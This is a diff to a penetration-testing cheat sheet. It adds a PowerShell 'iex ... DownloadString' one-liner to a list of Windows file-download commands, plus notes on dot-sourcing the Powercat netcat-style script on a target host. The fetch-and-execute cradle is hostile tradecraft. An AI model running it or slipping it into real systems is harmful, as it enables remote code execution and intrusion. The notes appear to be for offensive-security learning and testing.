@@ -34,6 +34,7 @@ Windows
 powershell -command wget -o <file_name> <full_url_path>
 powershell -command curl -o <file_name> <full_url_path>
 powershell -command Invoke-WebRequest <url> -O <file.jpg>
+iex (New-Object System.Net.Webclient).DownloadString('<URL>')
 ```
 ---
 
@@ -290,3 +291,13 @@ Powercat is essentially the Powershell version of Netcat wrriten by `besimorhino
  apt install powercat
 ```
 _Which will place the script in /usr/share/windows-resources/powercat_
+
+With the script on the target host, we start by using a PowerShell feature known as `Dot-Sourcing` to load the powercat.ps1 script. This will make all the variable and functions declared in the script available in the current PowerShell scope. So, we can use the powercat function directly.
+
+```powershell
+ . .\powercat.ps1
+```
+After script loaded:
+```powershell
+ powercat -h
+```
